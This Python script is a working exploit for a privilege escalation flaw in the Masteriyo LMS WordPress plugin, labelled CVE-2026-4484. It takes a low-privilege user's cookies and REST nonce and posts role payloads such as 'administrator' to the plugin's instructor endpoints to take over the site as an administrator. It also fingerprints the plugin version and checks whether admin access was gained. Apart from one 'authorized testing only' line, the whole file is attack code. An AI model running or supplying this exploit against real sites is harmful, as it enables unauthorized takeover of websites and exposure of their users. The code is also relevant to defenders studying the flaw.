#!/usr/bin/env python3
"""
CVE-2026-4484 - Masteriyo LMS Privilege Escalation
Enhanced cookie parser for ANY format
"""

import requests
import json
import re
import sys
from urllib.parse import unquote
from bs4 import BeautifulSoup

class MasteriyoExploit:
    def __init__(self, target_url, nonce, cookie_string):
        self.target_url = target_url.rstrip('/')
        self.nonce = nonce
        self.session = requests.Session()
        
        # Parse cookies - handles ANY format
        self.cookies = self.parse_cookies_advanced(cookie_string)
        
        # Set headers
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': f'{self.target_url}/account/'
        }
        
        # Add nonce to headers if provided
        if self.nonce:
            self.headers['X-WP-Nonce'] = self.nonce
        
        print(f"[*] Loaded {len(self.cookies)} cookies")
    
    def parse_cookies_advanced(self, cookie_string):
        """
        Parse cookies from ANY format - handles:
        - Standard cookie strings
        - URL encoded values
        - Cookies with % signs
        - Empty values
        - Malformed cookies
        """
        cookies = {}
        
        # First, URL decode the entire string if it looks encoded
        if '%' in cookie_string:
            try:
                cookie_string = unquote(cookie_string)
                print("[*] URL decoded cookie string")
            except:
                pass
        
        # Split by semicolon and space, or just semicolon
        # Some formats have "; " others just ";"
        if '; ' in cookie_string:
            cookie_pairs = cookie_string.split('; ')
        else:
            cookie_pairs = cookie_string.split(';')
        
        for pair in cookie_pairs:
            if not pair.strip():
                continue
                
            # Find the first equals sign (cookie values might contain =)
            if '=' in pair:
                # Split only on first equals sign
                eq_index = pair.find('=')
                key = pair[:eq_index].strip()
                value = pair[eq_index + 1:].strip()
                
                # Remove any remaining URL encoding
                if '%' in value:
                    try:
                        value = unquote(value)
                    except:
                        pass
                
                # Handle special cases
                if value == '(none)' or value == '':
                    value = ''
                
                cookies[key] = value
        
        return cookies
    
    def load_cookies_from_file(self, filepath):
        """Load cookie string from a file (for very long cookie strings)"""
        try:
            with open(filepath, 'r') as f:
                cookie_string = f.read().strip()
            return self.parse_cookies_advanced(cookie_string)
        except Exception as e:
            print(f"[-] Error loading cookie file: {e}")
            return {}
    
    def get_user_id(self):
        """Get current user ID from WordPress REST API"""
        print("[*] Getting user ID...")
        url = f"{self.target_url}/wp-json/wp/v2/users/me"
        
        # Try with and without nonce
        headers_variants = [
            self.headers,
            {**self.headers, 'X-WP-Nonce': ''},  # without nonce
            {'User-Agent': self.headers['User-Agent']}  # minimal headers
        ]
        
        for headers in headers_variants:
            try:
                response = self.session.get(url, headers=headers, cookies=self.cookies)
                
                if response.status_code == 200:
                    user_data = response.json()
                    user_id = user_data.get('id')
                    print(f"[+] User ID found: {user_id}")
                    print(f"[+] Username: {user_data.get('name', 'Unknown')}")
                    return user_id
                elif response.status_code == 401:
                    print("[-] Authentication failed - cookies may be expired")
                else:
                    print(f"[-] Status {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
        
        return None
    
    def find_nonce_from_page(self):
        """If nonce not provided, try to extract from page"""
        print("[*] Attempting to extract nonce from page...")
        
        try:
            response = self.session.get(f"{self.target_url}/account/", cookies=self.cookies)
            if response.status_code == 200:
                # Look for wp_rest nonce
                patterns = [
                    r'wp_rest["\']?\s*:\s*["\']([^"\']+)',
                    r'X-WP-Nonce["\']?\s*:\s*["\']([^"\']+)',
                    r'rest_nonce["\']?\s*:\s*["\']([^"\']+)',
                    r'nonce["\']?\s*:\s*["\']([a-f0-9]+)',
                    r'name="_wpnonce"\s+value="([^"]+)"'
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, response.text)
                    if match:
                        nonce = match.group(1)
                        print(f"[+] Found nonce: {nonce}")
                        return nonce
        except Exception as e:
            print(f"[-] Error extracting nonce: {e}")
        
        return None
    
    def escalate_privileges(self, user_id=None):
        """Send privilege escalation request"""
        print("[*] Attempting privilege escalation...")
        
        endpoints = []
        if user_id:
            endpoints.append(f"{self.target_url}/wp-json/masteriyo/v1/users/instructors/{user_id}")
        endpoints.append(f"{self.target_url}/wp-json/masteriyo/v1/users/instructors/me")
        
        # Try different payload formats
        payloads = [
            {"roles": ["administrator"]},
            {"role": "administrator"},
            {"user_role": "administrator"},
            {"capabilities": {"administrator": True}}
        ]
        
        # Try with and without nonce
        for endpoint in endpoints:
            for payload in payloads:
                # Try different header combinations
                headers_to_try = [
                    self.headers,
                    {**self.headers, 'X-WP-Nonce': ''},
                    {'Content-Type': 'application/json', 'User-Agent': self.headers['User-Agent']}
                ]
                
                for headers in headers_to_try:
                    try:
                        print(f"[*] Trying: {endpoint}")
                        response = self.session.post(
                            endpoint,
                            headers=headers,
                            cookies=self.cookies,
                            json=payload
                        )
                        
                        print(f"[*] Status: {response.status_code}")
                        
                        if response.status_code in [200, 201]:
                            try:
                                data = response.json()
                                if data.get('id') or data.get('message') == 'User updated':
                                    print(f"[+] SUCCESS! Privilege escalation worked!")
                                    return True
                            except:
                                print(f"[+] Got success status!")
                                return True
                                
                    except Exception as e:
                        continue
        
        return False
    
    def verify_admin_access(self):
        """Verify admin access by checking various admin endpoints"""
        print("[*] Verifying admin access...")
        
        admin_endpoints = [
            f"{self.target_url}/wp-admin/",
            f"{self.target_url}/wp-json/wp/v2/users",
            f"{self.target_url}/wp-json/masteriyo/v1/settings"
        ]
        
        for url in admin_endpoints:
            try:
                response = self.session.get(url, headers=self.headers, cookies=self.cookies, allow_redirects=False)
                
                if response.status_code == 200:
                    if "dashboard" in response.text.lower() or "users" in response.text.lower():
                        print(f"[+] ADMIN ACCESS CONFIRMED!")
                        return True
                elif response.status_code == 302:
                    location = response.headers.get('Location', '')
                    if 'wp-admin' in location:
                        print(f"[+] ADMIN ACCESS CONFIRMED! (Redirected)")
                        return True
                        
            except Exception as e:
                continue
        
        print("[-] Could not confirm admin access")
        return False
    
    def check_masteriyo_version(self):
        """Check Masteriyo plugin version"""
        print("[*] Checking Masteriyo version...")
        
        version_urls = [
            f"{self.target_url}/wp-content/plugins/learning-management-system/readme.txt",
            f"{self.target_url}/wp-content/plugins/masteriyo/readme.txt"
        ]
        
        for url in version_urls:
            try:
                response = self.session.get(url, cookies=self.cookies)
                if response.status_code == 200:
                    version_match = re.search(r'Stable tag: (\d+\.\d+\.\d+)', response.text)
                    if version_match:
                        version = version_match.group(1)
                        print(f"[+] Masteriyo version: {version}")
                        
                        if version <= '2.1.6':
                            print("[+] Version is VULNERABLE")
                            return True
                        else:
                            print("[-] Version is PATCHED")
                            return False
            except:
                continue
        
        print("[-] Could not determine version")
        return None
    
    def debug_cookies(self):
        """Debug: Show loaded cookies (hiding sensitive values)"""
        print("\n[*] Loaded cookies:")
        for key in list(self.cookies.keys())[:5]:  # Show first 5
            value = self.cookies[key][:30] + '...' if len(self.cookies[key]) > 30 else self.cookies[key]
            print(f"    {key} = {value}")
        if len(self.cookies) > 5:
            print(f"    ... and {len(self.cookies) - 5} more")
    
    def run(self):
        """Main exploit flow"""
        print("=" * 60)
        print("CVE-2026-4484 - Masteriyo LMS Privilege Escalation")
        print("=" * 60)
        
        # Debug: Show loaded cookies
        self.debug_cookies()
        
        # Try to find nonce if not provided
        if not self.nonce:
            print("\n[*] No nonce provided, attempting to extract...")
            self.nonce = self.find_nonce_from_page()
            if self.nonce:
                self.headers['X-WP-Nonce'] = self.nonce
        
        # Check version
        vulnerable = self.check_masteriyo_version()
        
        if vulnerable is False:
            print("\n[!] Site appears patched. Exploit may not work.")
        
        # Get user ID
        user_id = self.get_user_id()
        
        if not user_id:
            print("\n[*] Could not get user ID, trying escalation without ID...")
        
        # Escalate privileges
        if self.escalate_privileges(user_id):
            self.verify_admin_access()
            print("\n" + "=" * 60)
            print("[+] Exploit completed!")
            print(f"[+] Try accessing: {self.target_url}/wp-admin/")
            print("=" * 60)
        else:
            print("\n[-] Exploit failed. Site may be patched or protected.")


def main():
    print("[!] For authorized security testing only\n")
    
    print("=" * 50)
    print("Enter information from browser's Network tab:")
    print("=" * 50)
    
    target = input("\nTarget URL (e.g., https://example.com): ").strip()
    nonce = input("X-WP-Nonce (optional, press Enter to skip): ").strip()
    
    print("\nPaste the cookie string (from 'cookie' request header):")
    print("(Can be any format - the script handles it all)")
    print("-" * 50)
    
    # Allow multiline paste
    lines = []
    print("Paste your cookie(s) then press Enter twice:")
    while True:
        try:
            line = input()
            if not line and lines:
                break
            if line:
                lines.append(line)
        except EOFError:
            break
    
    cookie_string = ' '.join(lines).strip()
    
    if not target or not cookie_string:
        print("[-] Target URL and cookies are required")
        sys.exit(1)
    
    # Optional: Save cookie to file for large cookies
    if len(cookie_string) > 5000:
        save = input("\nCookie string is very long. Save to file? (y/n): ").strip().lower()
        if save == 'y':
            filename = input("Filename [cookies.txt]: ").strip() or "cookies.txt"
            with open(filename, 'w') as f:
                f.write(cookie_string)
            print(f"[*] Cookies saved to {filename}")
            
            # Reload from file
            exploit = MasteriyoExploit(target, nonce, "")
            exploit.cookies = exploit.load_cookies_from_file(filename)
            exploit.run()
            return
    
    exploit = MasteriyoExploit(target, nonce, cookie_string)
    exploit.run()


if __name__ == "__main__":
    main()
